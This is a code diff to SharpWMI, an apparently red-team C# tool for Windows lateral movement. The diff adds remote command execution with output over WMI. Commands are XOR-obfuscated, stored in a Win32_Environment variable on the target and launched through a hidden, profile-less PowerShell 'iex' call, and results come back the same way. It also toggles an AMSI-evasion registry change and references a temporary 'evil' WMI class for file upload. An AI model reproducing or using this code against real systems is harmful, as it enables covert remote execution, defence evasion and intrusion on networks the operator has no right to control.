@@ -87,12 +87,7 @@ End If
 Set xhr = Nothing
 ";
 
-        //
-        // Store WMI execution results in this class and it's property. The proper WMI class candidate
-        // must typically exist across Windows versions and return ideally only one WMI instance object.
-        //
-        private static string ExecutionResultClassName = "Win32_OSRecoveryConfiguration";
-        private static string ExecutionResultPropertyName = "DebugFilePath";
+        private static string ExecutionResultVariableName = "_Context##RANDOM##";
 
         //
         // During file upload we'll need to create a temporary evil WMI class having one property.
@@ -176,7 +171,7 @@ VBS Script execution:
 
 EXAMPLES:
 
-  SharpWMI.exe action=query query =""select * from win32_process""
+  SharpWMI.exe action=query query=""select * from win32_process""
 
   SharpWMI.exe action=query query=""SELECT * FROM AntiVirusProduct"" namespace=""root\\SecurityCenter2""
 
@@ -285,7 +280,12 @@ EXAMPLES:
 
             var output = new List<Dictionary<string, string>>();
 
-            ConnectionOptions options = new ConnectionOptions();
+            ConnectionOptions options = new ConnectionOptions
+            {
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.PacketPrivacy,
+                EnablePrivileges = true,
+            };
 
             Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);
             Console.WriteLine("  Query: \"{0}\"\r\n", wmiQuery);
@@ -313,7 +313,7 @@ EXAMPLES:
 
                     foreach (System.Management.PropertyData prop in props)
                     {
-                        entry[prop.Name] = (string)prop.Value;
+                        entry[prop.Name] = (string)Convert.ChangeType(prop.Value, typeof(string));
                     }
 
                     output.Add(entry);
@@ -337,29 +337,34 @@ EXAMPLES:
                 return;
             }
 
+            var uniqUsers = new HashSet<string>();
+
             foreach (var entry in loggedOns)
             {
-                string user = entry["Antecedent"];
-
-                if (user.IndexOf("DWM-") != -1 || user.IndexOf("UMFD-") != -1) continue;
+                string ant = entry["Antecedent"];
+                if (ant.IndexOf("DWM-") != -1 || ant.IndexOf("UMFD-") != -1) continue;
 
                 string domainPrefix = "Domain=\"", userPrefix = "\",Name=\"";
-                var pos = user.IndexOf(domainPrefix);
+                var pos = ant.IndexOf(domainPrefix);
 
-                if(pos != -1)
+                if (pos != -1)
                 {
                     string d, u;
-                    var pos2 = user.IndexOf('"', pos + domainPrefix.Length);
-                    var pos3 = user.IndexOf(userPrefix);
+                    var pos2 = ant.IndexOf('"', pos + domainPrefix.Length);
+                    var pos3 = ant.IndexOf(userPrefix);
                     if (pos2 != -1 && pos3 != -1)
                     {
-                        d = user.Substring((pos + domainPrefix.Length), pos3 - (pos + domainPrefix.Length));
-                        u = user.Substring((pos3 + userPrefix.Length), user.Length - (pos3 + userPrefix.Length) - 1);
-                        user = String.Format(@"{0}\{1}", d, u);
+                        d = ant.Substring((pos + domainPrefix.Length), pos3 - (pos + domainPrefix.Length));
+                        u = ant.Substring((pos3 + userPrefix.Length), ant.Length - (pos3 + userPrefix.Length) - 1);
+                        ant = String.Format(@"{0}\{1}", d, u);
                     }
                 }
 
-                Console.WriteLine("{0,-15}: {1}", computerName, user);
+                if (!uniqUsers.Contains(ant))
+                {
+                    Console.WriteLine("{0,-15}: {1}", computerName, ant);
+                    uniqUsers.Add(ant);
+                }
             }
         }
 
@@ -370,7 +375,12 @@ EXAMPLES:
                 wmiNameSpace = "root\\cimv2";
             }
 
-            ConnectionOptions options = new ConnectionOptions();
+            ConnectionOptions options = new ConnectionOptions
+            {
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.PacketPrivacy,
+                EnablePrivileges = true,
+            };
 
             Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);
 
@@ -409,9 +419,132 @@ EXAMPLES:
                 Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
             }
         }
-        static string GetWMIResultProperty(ManagementScope scope)
+
+        private static List<Dictionary<string, string>> GetWMIQueryResultsList(string host, string user, string password, string wmiQuery, string wmiNamespace)
         {
-            string wmiQuery = String.Format(@"SELECT {0} FROM {1}", ExecutionResultPropertyName, ExecutionResultClassName);
+            var output = new List<Dictionary<string, string>>();
+
+            var scope = new ManagementScope();
+            string r = ConnectToWMI(ref scope, host, user, password, wmiNamespace);
+            if (r.Length > 0)
+            {
+                throw new Exception(r);
+            }
+
+            try
+            {
+                ObjectQuery query = new ObjectQuery(wmiQuery);
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
+                ManagementObjectCollection data = searcher.Get();
+
+                if (data != null)
+                {
+                    foreach (ManagementObject result in data)
+                    {
+                        System.Management.PropertyDataCollection props = result.Properties;
+                        Dictionary<string, string> entry = new Dictionary<string, string>();
+
+                        foreach (System.Management.PropertyData prop in props)
+                        {
+                            entry[prop.Name] = (string)Convert.ChangeType(prop.Value, typeof(string));
+                        }
+
+                        output.Add(entry);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                throw;
+            }
+
+            return output;
+        }
+
+        private static string ConnectToWMI(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
+        {
+            ConnectionOptions connOptions = new ConnectionOptions
+            {
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.PacketPrivacy,
+                EnablePrivileges = true,
+            };
+
+            if (!String.IsNullOrEmpty(user) && !String.IsNullOrEmpty(password))
+            {
+                connOptions.Username = user;
+                connOptions.Password = password;
+            }
+
+            if (String.IsNullOrEmpty(wmiNamespace))
+            {
+                wmiNamespace = "root\\cimv2";
+            }
+
+            string fullNamespace;
+
+            if (!String.IsNullOrEmpty(host))
+            {
+                fullNamespace = String.Format(@"\\{0}\{1}", host, wmiNamespace);
+            }
+            else
+            {
+                fullNamespace = String.Format(@"\\.\{0}", wmiNamespace);
+            }
+
+            try
+            {
+                scope = new ManagementScope(fullNamespace, connOptions);
+                scope.Connect();
+            }
+            catch (UnauthorizedAccessException)
+            {
+                return String.Format("Username: {0} with Password {1} threw an unauthorised exception\n", user, password);
+            }
+            catch (Exception e)
+            {
+                return String.Format("[!] WMI connection failed: {0}", e.Message);
+            }
+
+            if (scope == null)
+                return "[!] Could not reach to remote RPC Server. Check your IP address";
+
+            return "";
+        }
+
+        static string GetWMIResultProperty(ManagementScope scope, string varName, string userName)
+        {
+            //var result = GetWmiProperty(scope, "Win32_Environment", "VariableValue", String.Format("Name='{0}' AND UserName='{1}'", varName, userName));
+            var result = GetWmiProperty(scope, "Win32_Environment", "VariableValue", String.Format("Name='{0}'", varName));
+            return result;
+        }
+
+        static string ResetWMIResultProperty(ManagementScope scope, string varName, string userName)
+        {
+            if (!String.IsNullOrEmpty(varName))
+            {
+                try
+                {
+                    return DelEnvVar(scope, varName, userName);
+                }
+                catch (Exception ex2)
+                {
+                    return String.Format("[!] Could not remove an environment variable with command results named {0}: {1}", varName, ex2.Message);
+                }
+            }
+
+            return "";
+        }
+
+        static string GetWmiProperty(ManagementScope scope, string className, string propertyName, string where = null)
+        {
+            string wmiQuery = String.Format(@"SELECT {0} FROM {1}", propertyName, className);
+            if (where != null)
+            {
+                // WQL Injection ^.^
+                wmiQuery += " WHERE " + where;
+            }
+
             try
             {
                 ObjectQuery query = new ObjectQuery(wmiQuery);
@@ -423,35 +556,149 @@ EXAMPLES:
                     System.Management.PropertyDataCollection props = result.Properties;
                     foreach (System.Management.PropertyData prop in props)
                     {
-                        WMIProperty = prop.Value.ToString();
+                        if (String.Compare(prop.Name, propertyName, StringComparison.OrdinalIgnoreCase) == 0)
+                        {
+                            WMIProperty = prop.Value.ToString();
+                            if (!String.IsNullOrEmpty(WMIProperty)) return WMIProperty;
+                        }
                     }
-
                 }
-                return WMIProperty;
             }
             catch (Exception ex)
             {
-                return "";
+                throw new Exception(String.Format("[!] Could not retrieve WMI property value using query: '{0}'! Exception: {1}", wmiQuery, ex.ToString()));
             }
+
+            return "";
         }
 
-        static void SetWMIResultProperty(ManagementScope scope, string newvalue)
+        private static string SetEnvVarValue(string varAndValue, string host, string user, string password, string wmiNamespace)
         {
-            ManagementClass configClass = new ManagementClass(scope, new ManagementPath(ExecutionResultClassName), null);
-            ManagementObjectCollection MyCollection = configClass.GetInstances();
+            var scope = new ManagementScope();
+            string r = ConnectToWMI(ref scope, host, user, password, "root\\cimv2");
+            if (r.Length > 0)
+            {
+                return r;
+            }
 
             try
             {
-                foreach (ManagementObject MyObject in MyCollection)
+                return SetEnvVarValue(scope, varAndValue, user);
+            }
+            catch (Exception ex)
+            {
+                return String.Format("[!] Could not set variable over WMI: {0}", ex.Message);
+            }
+        }
+
+        private static string SetEnvVarValue(ManagementScope scope, string varAndValue, string user)
+        {
+            StringBuilder results = new StringBuilder();
+
+            bool found = false;
+            ManagementClass configClass = new ManagementClass(scope, new ManagementPath("Win32_Environment"), null);
+
+            string variable = "", value = "", userName = "";
+
+            try
+            {
+                var pos = varAndValue.IndexOf("=");
+
+                if (pos == -1)
                 {
-                    MyObject.SetPropertyValue(ExecutionResultPropertyName, newvalue);
-                    MyObject.Put();
+                    return "[!] In order to set an environment variable using WMI - follow the form of: name=value (where value may be surrounded with quotes)";
+                }
+
+                variable = varAndValue.Substring(0, pos);
+                value = varAndValue.Substring(pos + 1);
+
+                if (value[0] == '"')
+                {
+                    if (value[value.Length - 1] != '"')
+                    {
+                        return "[!] Environment value's started with quote but not ended with one. Syntax: name=\"value\"";
+                    }
+
+                    value = value.Substring(1, value.Length - 2);
+                }
+
+                if (!String.IsNullOrEmpty(user))
+                {
+                    userName = String.Format("{0}\\{1}", GetWmiProperty(scope, "Win32_ComputerSystem", "Name"), user);
+                }
+                else
+                {
+                    userName = GetWmiProperty(scope, "Win32_ComputerSystem", "UserName");
+                }
+
+                var variables = configClass.GetInstances();
+                foreach (ManagementObject envvar in variables)
+                {
+                    string name = (string)envvar.GetPropertyValue("Name");
+                    if (String.IsNullOrEmpty(name)) continue;
+
+                    if (String.Compare(name, variable, StringComparison.OrdinalIgnoreCase) == 0)
+                    {
+                        //Console.WriteLine("[.] Overridding an environment variable: {0} = \"{1}\"", variable, value);
+
+                        envvar.SetPropertyValue("VariableValue", value.Trim());
+                        envvar.SetPropertyValue("UserName", userName);
+                        envvar.Put();
+                        found = true;
+                        break;
+                    }
+                }
+
+                if (!found)
+                {
+                    //Console.WriteLine("[.] Setting a new environment variable on: {0} = \"{1}\"", variable, value);
+
+                    ManagementObject mo = configClass.CreateInstance();
+                    mo["Name"] = variable;
+                    mo["UserName"] = userName;
+                    mo["VariableValue"] = value.Trim();
+                    mo.Put();
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[X] Exception in recovery: {0}", ex.Message);
+                throw new Exception(String.Format("[!] Could not set variable over WMI ({0}: {1} = '{2}'):    {3}", userName, variable, value, ex.ToString()));
             }
+
+            return results.ToString();
+        }
+
+        private static string DelEnvVar(ManagementScope scope, string varName, string userName)
+        {
+            StringBuilder results = new StringBuilder();
+            ManagementClass configClass = new ManagementClass(scope, new ManagementPath("Win32_Environment"), null);
+
+            try
+            {
+                var variables = configClass.GetInstances();
+                foreach (ManagementObject envvar in variables)
+                {
+                    string name = (string)envvar.GetPropertyValue("Name");
+                    if (String.IsNullOrEmpty(name)) continue;
+
+                    string varUserName = (string)envvar.GetPropertyValue("UserName");
+                    if (String.IsNullOrEmpty(varUserName)) continue;
+
+                    if (String.Compare(name, varName, StringComparison.OrdinalIgnoreCase) == 0 &&
+                        String.Compare(varUserName, userName, StringComparison.OrdinalIgnoreCase) == 0)
+                    {
+                        //results.AppendFormat("[.] Removing variable from {0} environment: {1}", userName, name);
+                        envvar.Delete();
+                        break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                throw new Exception(String.Format("[!] Could not remove variable over WMI ({0}: {1}):    {2}\r\n", userName, varName, ex.ToString()));
+            }
+
+            return results.ToString();
         }
 
         //
@@ -599,15 +846,191 @@ EXAMPLES:
             }
         }
 
+        private static string XorEncode(string input, int key)
+        {
+            List<String> output = new List<string>();
+            byte ch;
+
+            for (int i = 0; i < input.Length; i++)
+            {
+                ch = (byte)(input[i] ^ key);
+                output.Add(String.Format("{0:00}", ch));
+            }
+
+            return String.Join(",", output.ToArray());
+        }
+
+        static void RemoteWMIExecuteWithOutput(string host, string command, string user, string password, bool evadeAmsi, bool quiet = false)
+        {
+            var scope = new ManagementScope();
+            string r = ConnectToWMI(ref scope, host, user, password, "root\\cimv2");
+            if (r.Length > 0)
+            {
+                Console.WriteLine(r);
+                return;
+            }
+
+            bool setResultVar = false;
+
+            var rnd = new Random();
+            string userName = "";
+            List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();
+
+            string resultVarName = ExecutionResultVariableName.Replace("##RANDOM##", rnd.Next(1, 1000000).ToString());
+            string varName = String.Format("_F{0}", rnd.Next(1, 1000000));
+
+            try
+            {
+                if (evadeAmsi)
+                {
+                    originalAmsiKey = SetRegKey(scope);
+                }
+
+                if (!String.IsNullOrEmpty(user))
+                {
+                    userName = String.Format("{0}\\{1}", GetWmiProperty(scope, "Win32_ComputerSystem", "Name"), user);
+                }
+                else
+                {
+                    userName = GetWmiProperty(scope, "Win32_ComputerSystem", "UserName");
+                }
+
+                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
+                ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
+
+                int randomXorKey = rnd.Next(1, 255);
+                int randomXorKey2 = rnd.Next(1, 255);
+
+                string encCommand = String.Format("iex([char[]](@({0})|%{{$_-bxor{1}}}) -join '')",
+                    XorEncode(command, randomXorKey2), randomXorKey2);
+
+                string tmpcmd = String.Format(
+                    @"$o=({0} |Out-String).Trim();$e=(([Int[]][Char[]]$o)|%{{$_-bxor{1}}})-Join',';Set-WmiInstance -Class Win32_Environment -PutType CreateOnly -Impersonation Impersonate -EnableAllPrivileges -Arguments @{{Name='{2}'; VariableValue=$e; UserName='{3}'}}",
+                    encCommand, randomXorKey, resultVarName, userName);
+
+                tmpcmd = tmpcmd.Replace('\n', ' ').Replace('\r', ' ').Replace('\t', ' ').Replace("  ", " ");
+
+                try
+                {
+                    SetEnvVarValue(scope, String.Format("{0}=\"{1}\"", varName, tmpcmd), user);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("{0}", ex.Message);
+                    return;
+                }
+
+                inParams["CommandLine"] = String.Format("powershell -w hidden -nop -c \"iex($env:{0})\"", varName);
+
+                setResultVar = true;
+                ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);
+
+                Console.WriteLine("[*] User name                      : {0}", userName);
+                Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
+                Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);
+
+                int count = 0;
+                bool gotResult = false;
+                string cmdResult = "";
+
+                while (true)
+                {
+                    string resultOfWmiExecution = GetWMIResultProperty(scope, resultVarName, userName);
+                    if (String.IsNullOrEmpty(resultOfWmiExecution))
+                    {
+                        if (count < 3)
+                        {
+                            count++;
+                            Thread.Sleep(3000);
+                        }
+                        else
+                        {
+                            break;
+                        }
+                    }
+                    else
+                    {
+                        gotResult = true;
+                        string[] tmp = resultOfWmiExecution.Split(',');
+
+                        try
+                        {
+                            SetEnvVarValue(scope, String.Format("{0}=\"{1}\"", varName, ""), user);
+                        }
+                        catch { }
+
+                        foreach (string i in tmp)
+                        {
+                            var n = (Convert.ToInt32(i)) ^ randomXorKey;
+                            cmdResult += Convert.ToChar(n);
+                        }
+                        break;
+                    }
+                }
+
+                if (gotResult)
+                {
+                    Console.WriteLine("[+] Command result:\r\n");
+                    Console.WriteLine(cmdResult);
+                }
+                else
+                {
+                    Console.WriteLine("[*] No results could be retrieved as apparently we didn't set environment variable with results.");
+                    Console.WriteLine("    This may indicate called SharpWMI did not invoked WMI using elevated/impersonated token.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(String.Format("[!] Exception catched while running remote process with output: {0}", ex.ToString()));
+            }
+
+            if (evadeAmsi)
+            {
+                try
+                {
+                    UnsetRegKey(scope, originalAmsiKey);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(String.Format("[!] Exception catched while restoring AMSI state: {0}", ex.ToString()));
+                }
+            }
+
+            if (!String.IsNullOrEmpty(varName))
+            {
+                try
+                {
+                    DelEnvVar(scope, varName, userName);
+                }
+                catch (Exception ex2)
+                {
+                    Console.WriteLine("[!] Could not remove interim environment variable named {0}: {1}", varName, ex2.Message);
+                }
+            }
+
+            if (setResultVar)
+            {
+                Console.WriteLine(ResetWMIResultProperty(scope, resultVarName, userName));
+            }
+        }
+
         static void RemoteWMIExecute(string host, string command, string username, string password, bool result, bool disableAmsi, bool quiet = false)
         {
             string wmiNameSpace = "root\\cimv2";
-            bool alteredOriginalWMIProperty = false;
-            string originalResultWMIPropertyValue = "";
+            ConnectionOptions options = new ConnectionOptions
+            {
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.PacketPrivacy,
+                EnablePrivileges = true,
+            };
 
-            ConnectionOptions options = new ConnectionOptions();
+            if (result)
+            {
+                RemoteWMIExecuteWithOutput(host, command, username, password, disableAmsi, quiet);
+                return;
+            }
 
-            if(!quiet) Console.WriteLine("\r\n[*] Host                           : {0}", host);
+            if (!quiet) Console.WriteLine("\r\n[*] Host                           : {0}", host);
             if (!quiet) Console.WriteLine("[*] Command                        : {0}", command);
 
             if (!String.IsNullOrEmpty(username))
@@ -629,12 +1052,6 @@ EXAMPLES:
                     originalAmsiKey = SetRegKey(scope);
                 }
 
-                // Store data in existing WMI property, but keep original value
-                if (result)
-                {
-                    originalResultWMIPropertyValue = GetWMIResultProperty(scope);
-                }
-
                 var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
 
                 ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
@@ -643,24 +1060,8 @@ EXAMPLES:
                 var rnd = new Random();
                 int randomXorKey = rnd.Next(1, 255);
 
-                if (result)
-                {
-                    string tmpcmd = String.Format(
-                        @"$o=({0} |Out-String).Trim();$e=(([Int[]][Char[]]$o)|%{{$_-bxor{1}}})-Join',';$a=Get-WmiObject -Class {2};$a.{3}=$e;$a.Put()",
-                        command, randomXorKey, ExecutionResultClassName, ExecutionResultPropertyName);
-
-                    tmpcmd = tmpcmd.Replace('\n', ' ').Replace('\r', ' ').Replace('\t', ' ').Replace("  ", " ");
-
-                    inParams["CommandLine"] = "powershell -w hidden -nop -c \"" + tmpcmd + "\"";
-                }
-                else
-                {
-                    inParams["CommandLine"] = command;
-                }
-
+                inParams["CommandLine"] = command;
                 ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);
-
-                if (result) alteredOriginalWMIProperty = true;
 
                 if (!quiet) Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
                 if (!quiet) Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);
@@ -669,56 +1070,10 @@ EXAMPLES:
                 {
                     UnsetRegKey(scope, originalAmsiKey);
                 }
-
-                if (result)
-                {
-                    int count = 0;
-                    while (true)
-                    {
-                        string resultOfWmiExecution = GetWMIResultProperty(scope);
-                        if (resultOfWmiExecution == originalResultWMIPropertyValue)
-                        {
-                            if (count < 3)
-                            {
-                                count++;
-                                //Console.WriteLine("[*] Trying to get command's result...");
-                                Thread.Sleep(3000);
-                            }
-                            else {
-                                //Console.WriteLine("[-] Maybe command resulted with no output.");
-                                break;
-                            }
-                        }
-                        else
-                        {
-                            string[] tmp = resultOfWmiExecution.Split(',');
-                            string cmdResult = "";
-
-                            foreach (string i in tmp)
-                            {
-                                var n = (Convert.ToInt32(i)) ^ randomXorKey;
-                                cmdResult += Convert.ToChar(n);
-                            }
-
-                            if (!quiet) Console.WriteLine("[+] Command result:\r\n\r\n");
-                            Console.WriteLine(cmdResult + "\r\n");
-                            break;
-                        }
-                    }
-
-                    //Console.WriteLine("[*] Restoring WMI Property used for execution result...");
-                    SetWMIResultProperty(scope, originalResultWMIPropertyValue);
-                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
-
-                if (result && alteredOriginalWMIProperty)
-                {
-                    //Console.WriteLine("[*] Restoring WMI Property used for execution result...");
-                    SetWMIResultProperty(scope, originalResultWMIPropertyValue);
-                }
             }
         }
 
@@ -726,7 +1081,13 @@ EXAMPLES:
         {
             try
             {
-                ConnectionOptions options = new ConnectionOptions();
+                ConnectionOptions options = new ConnectionOptions
+                {
+                    Impersonation = ImpersonationLevel.Impersonate,
+                    Authentication = AuthenticationLevel.PacketPrivacy,
+                    EnablePrivileges = true,
+                };
+
                 if (!String.IsNullOrEmpty(username))
                 {
                     Console.WriteLine("[*] User credentials: {0}", username);
@@ -879,7 +1240,12 @@ EXAMPLES:
             string className = FileUploadTempWMIClassName;
             string evilPropertyName = FileUploadTempWMIPropertyName;
 
-            ConnectionOptions options = new ConnectionOptions();
+            ConnectionOptions options = new ConnectionOptions
+            {
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.PacketPrivacy,
+                EnablePrivileges = true,
+            };
 
             Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);
 
